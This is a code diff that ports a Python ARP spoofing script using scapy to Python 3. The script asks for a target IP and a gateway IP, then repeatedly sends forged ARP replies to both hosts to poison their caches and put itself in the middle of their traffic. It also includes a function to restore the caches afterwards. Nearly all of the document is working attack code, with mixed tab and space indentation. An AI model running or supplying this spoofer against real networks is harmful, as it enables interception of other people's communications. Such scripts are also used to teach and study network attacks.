@@ -27,7 +27,7 @@ def get_mac(ip):
 
 def restore_arp(dest_ip, source_ip):
     dest_mac = get_mac(dest_ip)
-	source_mac = get_mac(source_ip)
+    source_mac = get_mac(source_ip)
 	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
     #if you don't specify source MAC(hwsrc), scapy will automatically send your MAC address
 	#print(packet.show()) - show what is in the packet being sent
@@ -39,10 +39,12 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 	
-target_ip = raw_input("Enter IP of target computer: ")
-spoof_ip = raw_input("Enter IP of computer to spoof (usually the gateway): ")
+target_ip = input("Enter IP of target computer: ")
+spoof_ip = input("Enter IP of computer to spoof (usually the gateway): ")
+print("\nRunning ARP spoofer, press Ctrl + C to exit")
+print("=============================================")
 
-forward_packets
+forward_packets()
 
 sent_packets_count = 0
 try:
@@ -50,7 +52,7 @@ try:
 	    spoof(target_ip, spoof_ip)
 		spoof(spoof_ip, target_ip)
 		sent_packets_count += 2
-		print("\r[+] Packets sent " + str(sent_packets_count),) #with python3 you use end=;
+		print("\r[+] Packets sent " + str(sent_packets_count), end="") #with python3 you use end=;
 		#places output into a buffer
 		#\r is a string literal - tells to always print statement from start of line, overwriting last
 		time.sleep(2)
